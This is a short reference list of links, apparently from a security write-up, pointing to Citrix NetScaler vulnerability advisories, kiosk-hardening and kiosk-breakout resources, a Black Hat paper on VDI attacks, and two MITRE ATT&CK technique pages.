- Citrix Support: CVE-2025-5777 and CVE-2025-5349 -- https://support.citrix.com/external/article/693420/
- Citrix Support: CVE-2025-12101 -- https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX695486
- Cybersecurity News: Scanning Citrix NetScaler Infrastructure -- https://cybersecuritynews.com/scanning-citrix-netscaler-login/
- Hexnode: Hardening Windows Kiosk Mode Security -- https://www.hexnode.com/blogs/hardening-windows-kiosk-mode-security-best-practices-for-enterprise-protection/
- CKBPro Certification: Certified Kiosk Breakout Professional -- https://pentestingexams.com/product/certified-kiosk-breakout-professional/
- Black Hat 2014: Practical Attacks Against VDI Solutions -- https://blackhat.com/docs/us-14/materials/us-14-Brodie-A-Practical-Attack-Against-VDI-Solutions-WP.pdf
- MITRE ATT&CK T1059: Command and Scripting Interpreter -- https://attack.mitre.org/techniques/T1059/
- MITRE ATT&CK T1218: System Binary Proxy Execution -- https://attack.mitre.org/techniques/T1218/
